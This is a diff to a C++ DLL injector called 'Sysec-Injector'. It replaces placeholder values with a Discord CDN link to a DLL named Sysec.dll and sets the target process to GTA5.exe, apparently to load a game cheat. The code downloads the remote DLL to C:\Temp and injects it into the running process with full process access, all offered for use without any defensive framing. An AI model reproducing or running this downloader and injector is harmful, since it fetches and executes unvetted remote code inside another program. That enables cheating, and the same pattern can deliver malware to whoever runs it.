@@ -57,7 +57,6 @@ BOOL downloadDLL(LPCTSTR url, LPCTSTR filePath)
 
 BOOL injectDLL(DWORD pid, LPCTSTR dllPath)
 {
-    Sleep(5000);
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
         return FALSE;
@@ -119,9 +118,9 @@ DWORD getProcessIdByName(const wchar_t* processName)
 
 int main()
 {
-    LPCTSTR url = L"Active Link Here";
+    LPCTSTR url = L"https://cdn.discordapp.com/attachments/1047594171734695976/1086628989893869568/Sysec.dll";
     LPCTSTR dllPath = L"C:\\Temp\\Sysec.dll";
-    LPCTSTR targetProcess = L"To Inject Here.exe";
+    LPCTSTR targetProcess = L"GTA5.exe";
 
     SetConsoleTitleA("Sysec-Injector");
     
@@ -146,9 +145,14 @@ int main()
                 Sleep(5000);
                 exit(0);
             }
+
+            if (pID)
+            {
+                std::cout << "Injecting...\n";
+                Sleep(15000);
+            }
         }
 
-        std::cout << "Injecting...\n";
         if (injectDLL(pID, dllPath))
         {
             std::cout << "DLL has been injected successfully.\n";
